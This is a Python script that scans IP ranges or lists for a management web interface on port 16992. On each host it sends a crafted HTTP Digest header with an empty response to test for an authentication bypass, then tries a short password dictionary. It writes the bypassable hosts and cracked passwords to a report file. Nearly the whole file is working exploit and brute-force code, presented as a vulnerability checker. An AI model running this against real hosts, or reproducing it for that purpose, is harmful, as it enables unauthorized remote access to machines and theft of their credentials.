import requests
from requests.auth import HTTPProxyAuth
from requests.auth import HTTPDigestAuth
from parse import compile
import hashlib as hs
import sys
import argparse
import ipaddress

vul_ip_list = []
known_password ={}

class checker():
    def __init__(self, ip):
        self.proxyDict = { 
          'http'  : '127.0.0.1:8080', 
          'https' : '127.0.0.1:8080'
        }
        self.ip = ip
        self.port = ['16992']
        self.open_port = []
        self.passlist = ['admin','password']
        self.url = 'http://' + ip + ':16992/index.htm'
    
    def Authcheeck(self):
        for p in self.open_port:
            print('    Get Http Digest Authentication information')
            try:
                res = requests.get(self.url, timeout=2)
            except Exception as e:
                print(e)
                continue
            
            try:
                result = res.headers['WWW-Authenticate'].split('"')
            except Exception as e:
                print("WWW-Auth is not exist - Maybe not support web UI.")
                print(e)
                continue
            headers = {'Authorization':'Digest username="admin", realm="{}", nonce="{}", uri="index.htm",response="", qop=auth, nc=00000001,cnonce=""'.format(result[1],result[3])}
            try:
                res = requests.get(self.url, headers=headers,timeout=2)
            except Exception as e:
                print(e)
                continue

            if res.status_code == 200:
                print("    Target host is vulnerable!!!!")
                vul_ip_list.append(self.ip)
            elif res.status_code == 401:
                print('    Target host is not vulnerable.')
                return res.headers['WWW-Authenticate']

    def Portcheck(self):
        for p in self.port:
            try:
                print('    Connecting on {} Port...'.format(p))
                res = requests.get(self.url, timeout=2)
            except Exception as e:
                print('        {} is Closed or Fail to establish connect to target host.'.format(p))
                continue
            self.open_port.append(p)
            print('        {} is open.'.format(p))
        if len(self.open_port) == 0:
            print('    Ports are all closed!')
            return False

    def Attack(self):
        for password in self.passlist:
            try:
                res = requests.get(self.url, auth=HTTPDigestAuth('admin',password), timeout=2, proxies=self.proxyDict)
            except Exception as e:
                print('        Host timeout.')
                return None
            if res.status_code == 200:
                print('    Target is unsafe for dictionary attack. Password is', password)
                return password
        print("    Target password is in safe condition")
        return None

    def test(self):
        print('[*]Checking Port on target host:',self.ip)
        self.open_port = []
        if self.Portcheck() == False:
            return
        print('[*]Authentication Check...')
        self.Authcheeck()
        print('[*]Dictionary Attack Check...')
        password = self.Attack()
        if password is not None:
            known_password[self.ip] = password
            

def report(fiename):
    with open(fiename, 'w') as f:
        f.write("Vulnerable ip list:\n")
        for ip in vul_ip_list:
            f.write('    '+ip+'\n')
        f.write("Use vulnerable password ip list:\n")
        for key in known_password.keys():
            f.write(key+" : "+known_password[key]+'\n')

def main():
    iplist = []
    parser = argparse.ArgumentParser()
    output = 'report.txt'

    parser.add_argument("-f", "--file", help="file that contain list of ip or range of ip")
    parser.add_argument("-i", "--ip", help="file that contain list of ip or range of ip")
    parser.add_argument('-o', '--output', help="Output file name")
    args = parser.parse_args()

    if args is None:
        return
    if args.ip is None:
        with open(args.file,'r') as f:
            while True:
                ip = f.readline()
                if not ip:
                    break
                ip = ip[:-1]
                iplist.append(ip)
        for ip in iplist:
            c = checker(ip)
            c.test()
            open_port = []
        print(vul_ip_list)
    elif args.file is None:
        if '-' in args.ip:
            tmp = args.ip.split('-')
            start = ipaddress.ip_address(tmp[0])
            end = ipaddress.ip_address(tmp[1])
            cur = start
            while cur <= end:
                c = checker(str(cur))
                c.test()
                cur = cur + 1
        else:
            c = checker(args.ip)
            c.test()
    elif (args.file is not None) and (args.ip is not None):
        print("You can only set one flag")

    if args.output is not None:
        output = args.output
    report(output)
        
if __name__ == '__main__':
    main()

